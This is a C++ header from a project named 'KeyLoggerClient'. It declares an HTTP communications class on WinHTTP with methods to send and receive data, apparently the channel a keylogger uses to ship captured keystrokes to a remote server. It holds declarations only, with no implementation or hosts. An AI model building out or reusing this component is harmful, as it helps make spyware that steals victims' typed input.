// KeyLoggerClient/include/communication/HttpComms.h
#ifndef HTTPCOMMS_H
#define HTTPCOMMS_H

#include "communication/BaseComms.h"
#include <vector>
#include <cstdint>
#include <windows.h>
#include <winhttp.h>

class Configuration;

class HttpComms : public BaseComms {
public:
    explicit HttpComms(Configuration* config);
    ~HttpComms() override;
    
    bool Initialize() override;
    bool SendData(const std::vector<uint8_t>& data) override;
    void Cleanup() override;
    [[nodiscard]] bool TestConnection() const override;
    std::vector<uint8_t> ReceiveData() override;
    
private:
    Configuration* m_config;
    HINTERNET m_hSession;
    HINTERNET m_hConnect;
};

#endif